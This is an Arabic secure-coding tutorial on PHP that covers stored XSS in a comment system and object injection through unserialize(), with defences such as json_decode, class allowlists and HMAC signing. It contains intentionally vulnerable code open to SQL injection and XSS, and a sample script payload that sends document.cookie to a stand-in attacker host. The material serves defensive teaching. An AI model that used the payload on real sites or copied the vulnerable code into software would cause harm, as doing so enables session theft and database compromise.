# تمرين تطبيقي: أمن البيانات والتعامل مع الثغرات 

## 1. ثغرات XSS في أنظمة التعليقات

تحدث ثغرة Cross-Site Scripting عندما يتم عرض مدخلات المستخدم في المتصفح دون تصفية أو ترميز.

### (أ) نظام تعليقات مصاب (Vulnerable)

PHP

```
// خطأ: عرض التعليقات مباشرة من قاعدة البيانات
if (isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    $sql = "INSERT INTO comments (comment) VALUES ('$comment')";
    mysqli_query($conn, $sql);
}

// عرض التعليقات بدون تصفية يؤدي لثغرة XSS
$result = mysqli_query($conn, "SELECT comment FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div class='comment'>" . $row['comment'] . "</div>";
}
```

**مثال على هجوم (Stored XSS):**

HTML

```
<script>
    // كود لسرقة ملفات تعريف الارتباط وإرسالها للمهاجم
    fetch('https://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

## 2. مخاطر الـ Serialization (تسلسل البيانات)

تعتبر دالة `unserialize()` في PHP خطيرة جداً إذا تم استخدامها مع بيانات قادمة من المستخدم، حيث يمكن أن تؤدي إلى حقن الكائنات (Object Injection).

### (أ) المقارنة بين JSON و Serialize

- **Serialize:** تخزن نوع البيانات والفئة، مما يسمح باستدعاء دوال سحرية (Magic Methods) مثل `__wakeup`.
    
- **JSON:** تخزن البيانات فقط كنص، مما يجعلها أكثر أماناً لتبادل المعلومات.
    

**مثال على الفرق برمجياً:**

PHP

```
// خطأ أمني كبير
$data = unserialize($_POST['data']); 

// الممارسة الصحيحة والآمنة
$data = json_decode($_POST['data'], true); 
```

## 3. طرق الحماية المتقدمة

### (أ) استخدام القائمة البيضاء للفئات (Allowlist)

في حال الضرورة القصوى لاستخدام `unserialize` في PHP 7+، يجب تحديد الفئات المسموح بها فقط.

PHP

```
class SafeUnserializer {
    private $allowed_classes = ['DateTime', 'UserSettings'];

    public function safeUnserialize($data) {
        return unserialize($data, ['allowed_classes' => $this->allowed_classes]);
    }
}
```

### (ب) التحقق من التوقيع الرقمي (HMAC)

لضمان عدم التلاعب بالبيانات المسلسلة أثناء انتقالها، نقوم بإضافة توقيع رقمي باستخدام مفتاح سري.

PHP

```
class SecureSerializer {
    private $secret_key = 'your-secret-key';

    public function secureSerialize($data) {
        $serialized = serialize($data);
        // إنشاء توقيع فريد للبيانات
        $signature = hash_hmac('sha256', $serialized, $this->secret_key);
        return base64_encode($signature . '|' . $serialized);
    }

    public function secureUnserialize($encoded) {
        $decoded = base64_decode($encoded);
        list($signature, $serialized) = explode('|', $decoded, 2);

        // التحقق من تطابق التوقيع قبل المعالجة
        if (!hash_equals($signature, hash_hmac('sha256', $serialized, $this->secret_key))) {
            throw new Exception("تم اكتشاف تلاعب في البيانات!");
        }
        return unserialize($serialized);
    }
}
```

## 4. ملخص القواعد الأمنية

1. **تجنب** دالة `unserialize()` مع أي بيانات خارجية.
    
2. **استخدم** `json_decode()` كبديل آمن.
    
3. **فعل** خيارات الأمان في JSON مثل `JSON_THROW_ON_ERROR` للتعامل مع الأخطاء بدقة.
    
4. **دائماً** تحقق من سلامة البيانات (Integrity) باستخدام التوقيع الرقمي في الأنظمة الحساسة.
